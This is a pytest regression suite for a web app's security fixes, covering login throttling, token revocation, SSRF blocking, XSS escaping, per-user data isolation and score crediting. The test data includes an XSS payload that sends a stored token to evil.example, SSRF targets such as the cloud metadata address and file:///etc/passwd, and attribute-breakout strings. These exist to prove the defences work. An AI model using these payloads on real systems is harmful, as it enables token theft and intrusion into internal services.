"""Security fixes: login throttling, token revocation, SSRF, XSS, data isolation, scoring.
Every test here failed on main before this change."""
import ast
import os
import re
import subprocess
import uuid
from datetime import datetime, timedelta

import pytest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


def _signup(client, email=None, password="Passw0rd!long"):
    email = email or f"s_{uuid.uuid4().hex[:8]}@example.com"
    r = client.post("/api/auth/signup", json={"email": email, "password": password, "name": "S", "consent": True})
    assert r.status_code == 200, r.text
    j = r.json()
    return {"Authorization": "Bearer " + j["token"]}, j["user"]["user_id"], email, j["token"]


# ── 1. login throttling ─────────────────────────────────────────

def test_password_guessing_is_throttled_per_account_even_with_spoofed_ips(client, app_mod):
    _, _, email, _ = _signup(client)
    codes = []
    for i in range(app_mod.LOGIN_MAX_FAILURES + 3):
        r = client.post("/api/auth/signin", headers={"X-Forwarded-For": f"198.51.100.{i}"},
                        json={"email": email, "password": f"wrong{i}"})
        codes.append(r.status_code)
    assert codes[:app_mod.LOGIN_MAX_FAILURES] == [401] * app_mod.LOGIN_MAX_FAILURES
    assert set(codes[app_mod.LOGIN_MAX_FAILURES:]) == {429}
    # the right password is refused too while locked, otherwise guessing just continues
    r = client.post("/api/auth/signin", headers={"X-Forwarded-For": "198.51.100.250"},
                    json={"email": email, "password": "Passw0rd!long"})
    assert r.status_code == 429


def test_unknown_email_is_throttled_the_same_way(client, app_mod):
    email = f"nobody_{uuid.uuid4().hex[:6]}@example.com"
    codes = [client.post("/api/auth/signin", json={"email": email, "password": "x" * 8}).status_code
             for _ in range(app_mod.LOGIN_MAX_FAILURES + 1)]
    assert codes[-1] == 429  # same behaviour as a real account: no enumeration via lockout


def test_successful_signin_clears_failures(client, app_mod):
    _, _, email, _ = _signup(client)
    for i in range(app_mod.LOGIN_MAX_FAILURES - 1):
        client.post("/api/auth/signin", json={"email": email, "password": f"wrong{i}"})
    assert client.post("/api/auth/signin", json={"email": email, "password": "Passw0rd!long"}).status_code == 200
    assert app_mod.login_failures_col.count_documents({"email": email}) == 0


def test_guest_creation_is_capped(client, app_mod, monkeypatch):
    monkeypatch.setattr(app_mod, "GUEST_HOURLY_CAP", 2)
    codes = [client.post("/api/auth/guest").status_code for _ in range(4)]
    assert 429 in codes


# ── 2. token revocation ─────────────────────────────────────────

def test_password_change_revokes_older_tokens(client, app_mod):
    h, uid, _, token = _signup(client)
    assert client.get("/api/inbox", headers=h).status_code == 200
    later = (datetime.utcnow() + timedelta(seconds=5)).isoformat()
    app_mod.users_col.update_one({"user_id": uid}, {"$set": {"password_changed_at": later}})
    app_mod._invalidate_user_cache(uid)
    assert client.get("/api/inbox", headers=h).status_code == 401
    assert client.get("/api/auth/me", headers=h).status_code == 401


def test_token_minted_after_the_change_still_works(client, app_mod):
    h, uid, _, _ = _signup(client)
    app_mod.users_col.update_one({"user_id": uid}, {"$set": {"password_changed_at": datetime.utcnow().isoformat()}})
    app_mod._invalidate_user_cache(uid)
    fresh = {"Authorization": "Bearer " + app_mod._make_token(uid)}
    assert client.get("/api/inbox", headers=fresh).status_code == 200


# ── 3. SSRF ─────────────────────────────────────────────────────

@pytest.mark.parametrize("url", [
    "http://169.254.169.254/latest/meta-data/",
    "http://10.0.0.5/admin",
    "http://192.168.1.1/",
    "http://100.64.0.1/",
    "http://[::1]:80/",
    "http://[fd00::1]/",
    "http://2130706433/",
    "http://127.1/",
    "http://api.railway.internal/",
    "http://example.com:8080/",
    "file:///etc/passwd",
    "gopher://example.com/",
])
def test_internal_and_odd_urls_are_refused(app_mod, url):
    from fastapi import HTTPException
    with pytest.raises(HTTPException) as e:
        app_mod._public_host_or_raise(url)
    assert e.value.status_code in (400, 422)


def test_a_name_that_resolves_to_a_private_ip_is_refused(app_mod, monkeypatch):
    import socket
    from fastapi import HTTPException
    monkeypatch.setattr(socket, "getaddrinfo",
                        lambda *a, **k: [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("10.1.2.3", 80))])
    with pytest.raises(HTTPException):
        app_mod._public_host_or_raise("http://jobs.example.com/listing")


def test_redirect_to_an_internal_address_is_refused(app_mod, monkeypatch):
    import socket
    import httpx
    from fastapi import HTTPException

    def fake_dns(host, port, **_k):
        ip = "93.184.216.34" if host == "jobs.example.com" else "169.254.169.254"
        return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", (ip, port))]
    monkeypatch.setattr(socket, "getaddrinfo", fake_dns)
    hits = []

    def handler(request):
        hits.append(str(request.url))
        return httpx.Response(302, headers={"location": "http://metadata.attacker.example/latest/"})
    real_client = httpx.Client
    monkeypatch.setattr(app_mod._httpx, "Client",
                        lambda **kw: real_client(transport=httpx.MockTransport(handler), **kw))
    with pytest.raises(HTTPException) as e:
        app_mod._fetch_jd_from_url("http://jobs.example.com/listing")
    assert e.value.status_code == 400
    assert hits == ["http://jobs.example.com/listing"]  # the internal hop was never requested


def test_remote_status_codes_are_not_echoed(app_mod, monkeypatch):
    import socket
    import httpx
    from fastapi import HTTPException
    monkeypatch.setattr(socket, "getaddrinfo",
                        lambda h, p, **k: [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("93.184.216.34", p))])
    real_client = httpx.Client
    monkeypatch.setattr(app_mod._httpx, "Client",
                        lambda **kw: real_client(transport=httpx.MockTransport(lambda r: httpx.Response(403)), **kw))
    with pytest.raises(HTTPException) as e:
        app_mod._fetch_jd_from_url("http://jobs.example.com/x")
    assert "403" not in str(e.value.detail)


def test_public_page_is_still_fetched(app_mod, monkeypatch):
    import socket
    import httpx
    monkeypatch.setattr(socket, "getaddrinfo",
                        lambda h, p, **k: [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("93.184.216.34", p))])
    page = "<html><title>SOC Analyst</title><body>" + ("Triage SIEM alerts and escalate incidents. " * 20) + "</body></html>"
    real_client = httpx.Client
    monkeypatch.setattr(app_mod._httpx, "Client",
                        lambda **kw: real_client(transport=httpx.MockTransport(
                            lambda r: httpx.Response(200, text=page, headers={"content-type": "text/html; charset=utf-8"})), **kw))
    title, text = app_mod._fetch_jd_from_url("https://jobs.example.com/x")
    assert title == "SOC Analyst" and "Triage SIEM" in text


# ── 4. XSS ──────────────────────────────────────────────────────

def _node_eval(js: str) -> str:
    src = open(os.path.join(ROOT, "static", "index.html")).read()

    def grab(name):
        st = src.index(f"function {name}(")
        i, d = src.index("{", st), 0
        while True:
            if src[i] == "{":
                d += 1
            elif src[i] == "}":
                d -= 1
                if d == 0:
                    return src[st:i + 1]
            i += 1
    prog = "\n".join(grab(n) for n in ("esc", "jsq", "mdRender")) + "\n" + js
    return subprocess.run(["node", "-e", prog], capture_output=True, text=True, check=True).stdout


EVIL = "';location='https://evil.example/?'+localStorage.fdToken;'"


def test_jira_link_cannot_carry_script():
    out = _node_eval(f"process.stdout.write(mdRender({EVIL!r}.replace(/^/, 'See [X](firstdesk://jira/') + ')'))")
    assert "onclick" not in out
    ok = _node_eval("process.stdout.write(mdRender('See [COMP-014](firstdesk://jira/COMP-014)'))")
    assert "ojum('COMP-014')" in ok


def test_handler_argument_decodes_to_one_harmless_string():
    import html
    import json
    out = _node_eval(f"process.stdout.write(jsq({EVIL!r}))")
    decoded = html.unescape(out)              # what the browser hands to the JS engine
    assert json.loads(decoded) == EVIL        # a single string literal, nothing executable
    assert "'" not in out and '"' not in out  # can't break out of the attribute either


def test_esc_escapes_quotes():
    assert _node_eval("process.stdout.write(esc(`\"'<>&`))") == "&quot;&#39;&lt;&gt;&amp;"


def test_no_inline_handler_interpolates_a_raw_value():
    src = open(os.path.join(ROOT, "static", "index.html")).read()
    bad = []
    for m in re.finditer(r'''on(?:click|change|input|submit|keydown|keyup|blur|focus)=\\?"([^"]{0,400}?)\\?"''', src):
        body = m.group(1)
        for a, c in re.findall(r"\$\{([^}]+)\}|'\s*\+\s*([^+']+?)\s*\+\s*'", body):
            expr = (a or c).strip()
            if not (expr.startswith("jsq(") or re.fullmatch(r"[a-z]", expr)):  # loop indexes are numbers
                bad.append(expr)
    assert not bad, bad


def test_generated_tool_ids_icon_and_tint_are_sanitised():
    from tool_dispatch import normalise_tool_spec
    spec = {"tool_type": "alerts", "name": "Queue", "icon": "x\" onmouseover=alert(1)", "tint": "red;}</",
            "data": {"alerts": [{"id": "A1');alert(1);('", "severity": "HIGH", "title": "t", "details": "d",
                                 "correct_action": "escalate", "points": 5}]}}
    out = normalise_tool_spec(spec)
    assert out is not None
    assert re.fullmatch(r"[a-z0-9_-]+", out["icon"]) and re.fullmatch(r"#[0-9A-Fa-f]{3,8}", out["tint"])
    assert all(re.fullmatch(r"[A-Za-z0-9_.-]+", a["id"]) for a in out["data"]["alerts"])


# ── 5. data isolation ───────────────────────────────────────────

def test_no_query_on_per_user_data_is_unscoped():
    """Regression guard: every query that matches a document by "id" must also
    scope it to the user's simulation/session."""
    src = open(os.path.join(ROOT, "app.py")).read()
    scope = {"simulation_id", "session_id", "user_id", "token_hash", "scenario_id",
             "fingerprint", "ext_id", "email"}
    global_cols = {"users_col", "progress_col", "password_resets_col", "jobs_col", "scenarios_col",
                   "careers_col", "interviews_col", "analytics_col", "login_failures_col"}
    ops = {"find_one", "find", "update_one", "update_many", "delete_one", "delete_many",
           "replace_one", "count_documents"}
    bad = []
    for n in ast.walk(ast.parse(src)):
        if (isinstance(n, ast.Call) and isinstance(n.func, ast.Attribute) and n.func.attr in ops
                and isinstance(n.func.value, ast.Name) and n.func.value.id.endswith("_col")
                and n.func.value.id not in global_cols and n.args and isinstance(n.args[0], ast.Dict)):
            keys = {k.value for k in n.args[0].keys if isinstance(k, ast.Constant)}
            if "id" in keys and not keys & scope:
                bad.append(f"line {n.lineno}: {n.func.value.id}.{n.func.attr}")
    assert not bad, bad


def _two_users(client, career="accountant"):
    a, b = _signup(client), _signup(client)
    for h in (a[0], b[0]):
        client.post("/api/start", headers=h, json={"career": career, "experience_level": "experienced", "reset": True})
    return a, b


def test_manager_email_reply_stays_in_its_own_simulation(client, app_mod):
    (ha, ua, *_), (hb, ub, *_) = _two_users(client)
    app_mod.set_scope(ub, "accountant")
    app_mod.send_reply.invoke({"email_id": "e2", "reply_text": "B's private reply"})
    a = app_mod.emails_col.find_one({"simulation_id": f"sim_{ua}", "id": "e2"})
    b = app_mod.emails_col.find_one({"simulation_id": f"sim_{ub}", "id": "e2"})
    assert a.get("reply_text") is None
    assert b.get("reply_text") == "B's private reply" and b.get("replied") is True


def test_system_events_fire_once_in_the_right_simulation(client, app_mod, monkeypatch):
    monkeypatch.setattr(app_mod, "observe_tone", lambda *a, **k: {})
    (ha, ua, *_), (hb, ub, *_) = _two_users(client)

    class Orc:
        def invoke(self, p, config=None):
            class M:
                content, type = "ok", "ai"
            return {"messages": list(p["messages"]) + [M()]}
    app_mod._user_orchestrators[ub] = Orc()
    for _ in range(9):
        client.post("/api/chat", headers=hb, json={"message": "status update"})
    a_ev = list(app_mod.system_events_col.find({"simulation_id": f"sim_{ua}", "triggered": True}))
    assert a_ev == []  # A never chatted
    b_warn = app_mod.emails_col.count_documents({"simulation_id": f"sim_{ub}", "category": "system",
                                                  "subject": {"$regex": "^⚠️"}})
    b_events = app_mod.system_events_col.count_documents({"simulation_id": f"sim_{ub}", "triggered": True})
    assert b_warn == b_events  # one warning per event, not one per message


# ── 6. scoring ──────────────────────────────────────────────────

def _first_completable(client, h):
    for t in client.get("/api/tasks", headers=h).json()["tasks"]:
        r = client.post(f"/api/task/{t['id']}/complete", headers=h)
        if r.status_code == 200 and r.json().get("ok"):
            return t["id"], r.json()["completion_credit"]
    pytest.skip("no completable task")


def test_completion_credit_is_paid_once(client, app_mod, monkeypatch):
    monkeypatch.setattr(app_mod, "_queue_manager_review", lambda *a, **k: None)
    h, uid, *_ = _signup(client)
    client.post("/api/start", headers=h, json={"career": "accountant", "experience_level": "experienced", "reset": True})
    tid, credit = _first_completable(client, h)
    before = app_mod.sessions_col.find_one({"session_id": f"sess_{uid}"})["score_adj"]
    for _ in range(5):
        client.post(f"/api/task/{tid}/complete", headers=h)
    assert app_mod.sessions_col.find_one({"session_id": f"sess_{uid}"})["score_adj"] == before
    assert credit > 0


def test_resubmitting_after_rework_does_not_pay_again(client, app_mod, monkeypatch):
    monkeypatch.setattr(app_mod, "_queue_manager_review", lambda *a, **k: None)
    h, uid, *_ = _signup(client)
    client.post("/api/start", headers=h, json={"career": "accountant", "experience_level": "experienced", "reset": True})
    tid, _ = _first_completable(client, h)
    app_mod.tasks_col.update_one({"id": tid, "simulation_id": f"sim_{uid}"},
                                 {"$set": {"status": "pending", "review_status": "needs_rework"}})
    before = app_mod.sessions_col.find_one({"session_id": f"sess_{uid}"})["score_adj"]
    r = client.post(f"/api/task/{tid}/complete", headers=h).json()
    assert r["ok"] and r["completion_credit"] == 0
    assert app_mod.sessions_col.find_one({"session_id": f"sess_{uid}"})["score_adj"] == before
    t = app_mod.tasks_col.find_one({"id": tid, "simulation_id": f"sim_{uid}"})
    assert t["review_status"] == "pending_review"  # back in the manager's queue


def test_take_ownership_is_not_triage_evidence(client, app_mod):
    h, uid, *_ = _signup(client)
    client.post("/api/start", headers=h, json={"career": "cybersecurity", "experience_level": "experienced", "reset": True})
    app_mod.set_scope(uid, "cybersecurity")
    al = app_mod.siem_col.find_one({"simulation_id": f"sim_{uid}"})
    client.post(f"/api/siem/{al['id']}/triage", headers=h, json={"action": "investigate"})
    assert app_mod._artifact_present("siem_triage:" + al["id"], {}) is False


def test_system_events_always_route_to_the_manager(app_mod, monkeypatch):
    calls = []

    class Misrouter:  # the failure mode: the router LLM picks a persona that can't review
        def invoke(self, *a, **k):
            calls.append(1)

            class R:
                content = "teammate"
            return R()
    monkeypatch.setattr(app_mod, "llm", Misrouter())
    out = app_mod._classify_route({"messages": [("human", "[SYSTEM EVENT — not a user message] review now")]})
    assert out == {"route": "manager"} and calls == []
